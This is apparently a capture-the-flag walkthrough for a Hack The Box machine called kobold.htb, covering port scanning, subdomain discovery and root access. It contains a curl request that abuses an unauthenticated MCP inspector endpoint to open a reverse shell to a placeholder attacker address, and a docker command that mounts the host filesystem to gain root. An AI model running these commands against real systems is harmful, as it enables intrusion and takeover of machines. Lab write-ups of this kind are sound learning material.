Tags: 
# **Nmap Results**

```text
Nmap scan report for 10.129.245.50
Host is up (0.017s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
| Not valid before: 2026-03-15T15:08:55
|_Not valid after:  2125-02-19T15:08:55
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to https://kobold.htb/
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.21 seconds
```
<br>
<br>

# **Service Enumeration**
Head over to the web app on port 80:

![[Pasted image 20260619164150.png]]

Nothing interesting here other than a potential user "admin" if you look towards the bottom.

If you do a full port scan with `nmap`, you'll find another web server on port 3552 that leads us to a login portal:

![[Pasted image 20260619164942.png]]

We don't have any creds so we'll come back.

`gobuster` didn't find any hidden subdomains on port 80, but on port 443, there were 2: "mcp.kobold.htb" and "bin.kobold.htb". The latter is just a pastebin site. "mcp" is the more interesting one:

![[Pasted image 20260619175438.png]]
<br>
<br>
# **Exploitation**
## **Initial Access**
If you look in settings, the version of mcpjam is 1.4.2, which is vulnerable to CVE-2026-23744. This is an RCE vuln caused by MCP inspector listening on all interfaces (0.0.0.0) instead of just localhost. It also doesn't have any authentication measures at all. This [GitHub advisory ](https://github.com/advisories/GHSA-232v-j27c-5pp6) contains a PoC for this vuln. 

You just execute the following:

```bash
curl -sk https://mcp.kobold.htb/api/mcp/connect \
  --header "Content-Type: application/json" \
  --data '{"serverConfig":{"command":"/bin/bash","args":["-c","bash -i >& /dev/tcp/<ATTACKER_IP/<ATTACKER_PORT> 0>&1"],"env":{}},"serverId":"test"}'
```

and get a shell as Ben:

![[Pasted image 20260619185326.png]]

<br>
<br>
# **Privilege Escalation**  
some docker trickery with ben, i forgor

```bash
newgrp docker
docker run -it --rm -v /:/mnt mysql chroot /mnt bash
```
<br>
<br>
# Skills Learned
- When a box has ports 80 and 443, treat them as separate web apps until proven otherwise. I initially ran a gobuster scan on http://kobold.htb, found nothing, and got stuck, but I had to scan https://kobold.htb instead (https instead of http) to find the vulnerable part.
<br>
<br>
# Proof of Pwn
Paste link to HTB Pwn notification after owning root